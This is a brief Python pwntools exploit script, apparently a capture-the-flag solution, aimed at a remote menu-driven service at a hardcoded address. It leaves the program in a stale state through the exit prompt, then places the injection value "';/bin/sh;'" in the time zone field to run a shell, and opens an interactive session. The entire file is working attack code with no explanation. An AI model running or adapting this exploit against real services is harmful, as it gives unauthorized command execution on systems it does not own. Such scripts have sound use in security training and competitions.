from pwn import *
 
io = remote("61.147.171.105",54847)
context.log_level = 'debug'
 
io.sendlineafter("> ","1")
io.sendlineafter("Format: ","A")
io.sendlineafter("> ","5")
io.sendlineafter("Are you sure you want to exit (y/N)? ",'N')
io.sendlineafter("> ","3")
io.sendlineafter("Time zone: ","';/bin/sh;'")
 
io.sendlineafter("> ","4")
 
io.interactive()